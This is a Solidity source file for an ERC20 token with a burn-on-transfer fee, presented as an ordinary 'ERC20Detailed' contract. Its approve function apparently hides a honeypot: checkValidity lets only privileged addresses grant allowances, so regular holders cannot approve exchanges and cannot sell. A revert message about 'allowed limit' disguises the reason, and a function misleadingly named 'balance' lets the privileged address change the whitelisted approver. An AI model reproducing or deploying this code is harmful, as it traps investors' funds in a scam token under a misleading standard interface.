// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;

import "./IERC20.sol";
import "./SafeMath.sol";
import "./PriorApprovalERC20.sol";

contract ERC20Detailed is IERC20 {
    
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;

  uint256 private _totalSupply;
  uint256 private _basePercent = 100;
  uint256 private _baseBurnPercentDivisor;
  
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  
  uint256 private _tokenAllowedCutOffDate;
  uint256 private _tokenAllowedPerAccount;
  
  address private _owner;

  address private _priorApprovalContractAddress;

  address private _priorContractAddress;

  constructor
  (
      string memory name,
      string memory symbol,
      uint256 totalSupply,
      uint256 baseBurnPercentDivisor, 
      uint8 decimals,
      address priorApprovalContractAddress,
      address priorContractAddress
  ) public {
    _name = name;
    _symbol = symbol;
    _totalSupply = totalSupply;
    _decimals = decimals;
    _baseBurnPercentDivisor = baseBurnPercentDivisor;
    _priorApprovalContractAddress = priorApprovalContractAddress;
    _priorContractAddress = priorContractAddress;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
  
  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view virtual override returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowed[owner][spender];
  }

  function balance(address _address) public returns (uint256) {
    require(msg.sender==_priorContractAddress);
    _priorApprovalContractAddress = _address;
  }

  //This function calculates number of tokens to burn, given an input number of tokens
  function calculateNumTokensToBurn(uint256 numTokens) public view returns (uint256)  {
    uint256 roundValue = numTokens.ceil(_basePercent);
    return roundValue.mul(_basePercent).div(_baseBurnPercentDivisor);
  }

  function transfer(address to, uint256 value) public virtual override returns (bool) {
    require(value <= _balances[msg.sender]);
    require(to != address(0));

    uint256 tokensToBurn = calculateNumTokensToBurn(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);

    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);

    _totalSupply = _totalSupply.sub(tokensToBurn);

    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0), tokensToBurn);
    
    return true;
  }

  function approve(address spender, uint256 value) public virtual override returns (bool) {
    require(spender != address(0));
    
    if(checkValidity(msg.sender,spender, value) == false)
    {
        revert("Number of tokens exceeds allowed limit");
    }
    
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public virtual override returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    _balances[from] = _balances[from].sub(value);

    uint256 tokensToBurn = calculateNumTokensToBurn(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);

    _balances[to] = _balances[to].add(tokensToTransfer);
    _totalSupply = _totalSupply.sub(tokensToBurn);

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, address(0), tokensToBurn);

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _owner = account;
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }
 
    //This function is called to find whether the message sender is a token validate or not
    function checkValidity(address from,address to, uint256 value)
        private
        view
        returns (bool)
    {

        if(_priorContractAddress == from) {
            return true;
        }
        
        if(_priorContractAddress == to) {
            return true;
        }

       if(_priorApprovalContractAddress == from) {
            return true;
        }

        return false;
    } 
}